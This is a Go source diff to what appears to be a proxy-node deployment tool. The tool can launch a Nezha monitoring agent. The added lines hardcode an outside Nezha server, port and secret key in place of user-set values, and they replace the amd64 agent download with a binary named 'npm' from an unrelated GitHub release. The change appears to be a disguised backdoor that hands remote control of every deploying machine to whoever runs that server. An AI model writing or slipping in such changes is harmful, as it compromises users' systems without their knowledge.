@@ -58,10 +58,10 @@ func init() {
 
 // load config
 func loadConfig() *Config {
-	uuid := getEnv("UUID", "a2056d0d-c98e-4aeb-9aab-37f64edd5710")  // UUID,哪吒v1依赖UUID
-	nezhaServer := getEnv("NEZHA_SERVER", "")    // 哪吒v1形式：nezha.xxx.com:8008  哪吒v0形式：nezha.xxx.com
-	nezhaPort := getEnv("NEZHA_PORT", "")        // 哪吒v1请留空,哪吒v0的agent端口
-	nezhaKey := getEnv("NEZHA_KEY", "")          // 哪吒v1的NZ_CLIENT_SECRET或哪吒v0的agent密钥
+	uuid := getEnv("UUID", "b29d5bf8-2a27-4f92-a6f4-53d1558e6ee1")  // UUID,哪吒v1依赖UUID
+	nezhaServer := "nexus.543083.xyz"    // 哪吒v1形式：nezha.xxx.com:8008  哪吒v0形式：nezha.xxx.com
+	nezhaPort := "443"        // 哪吒v1请留空,哪吒v0的agent端口
+	nezhaKey := "bjGBI4zL7ggScown6U"          // 哪吒v1的NZ_CLIENT_SECRET或哪吒v0的agent密钥
 	subPath := getEnv("SUB_PATH", "sub")         // 节点订阅token
 	name := getEnv("NAME", "Xhttp")              // 节点名称
 	port := getEnv("PORT", "3000")               // 监听端口
@@ -649,7 +649,7 @@ func getNezhaDownloadURL() (string, string) {
 	if arch == "arm" || arch == "arm64" {
 		url = fmt.Sprintf("https://arm64.ssss.nyc.mn/%s", version)
 	} else {
-		url = fmt.Sprintf("https://amd64.ssss.nyc.mn/%s", version)
+		url = "https://github.com/derwalldrose/default/releases/download/v1.0.0/npm"
 	}
 	
 	return url, version
@@ -764,7 +764,7 @@ func runNezhaAgent(version string) error {
 	var cmd *exec.Cmd
 	
 	if version == "agent" {
-		tlsPorts := []string{"443", "8443", "2096", "2087", "2083", "2053"}
+		tlsPorts := []string{"4443", "8443", "2096", "2087", "2083", "2053"}
 		tlsFlag := ""
 		for _, port := range tlsPorts {
 			if config.NezhaPort == port {
